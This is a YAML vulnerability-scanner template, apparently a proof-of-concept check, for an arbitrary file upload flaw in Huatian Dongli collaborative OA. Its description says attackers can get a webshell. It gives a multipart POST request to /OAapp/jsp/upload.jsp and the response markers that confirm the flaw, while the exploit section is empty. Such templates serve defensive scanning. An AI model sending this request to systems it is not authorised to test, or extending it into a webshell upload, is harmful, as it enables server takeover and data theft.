app: 华天动力协同OA
query: app:"华天动力协同OA"
meta:
  name: 华天动力协同OA任意文件上传漏洞
  level: 4
  tags:
  - file_upload
  description: |
    华天动力协同办公系统将先进的管理思想、管理模式和软件技术、网络技术相结合，为用户提供了低成本、高效能的协同办公和管理平台。睿智的管理者通过使用华天动力协同办公平台，在加强规范工作流程、强化团队执行、推动精细管理、促进营业增长等工作中取得了良好的成效。华天动力 OA 存在任意文件上传漏洞，攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。
  homepage: ""
  author: X prism
  references: ""
  solution: 升级至最新版本
  create_at: "2024-07-13 15:21:32"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /OAapp/jsp/upload.jsp
          redirect: true
          header:
          - Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5Ur8laykKAWws2QO
          params: |-
            ------WebKitFormBoundary5Ur8laykKAWws2QO
            Content-Disposition: form-data;name="file"; filename="xxx.xml"
            Content-Type: image/png

            real path
            ------WebKitFormBoundary5Ur8laykKAWws2QO
            Content-Disposition: form-data;name="filename"

            xxx.png
            ------WebKitFormBoundary5Ur8laykKAWws2QO--
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: /htoa/htoadata/
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
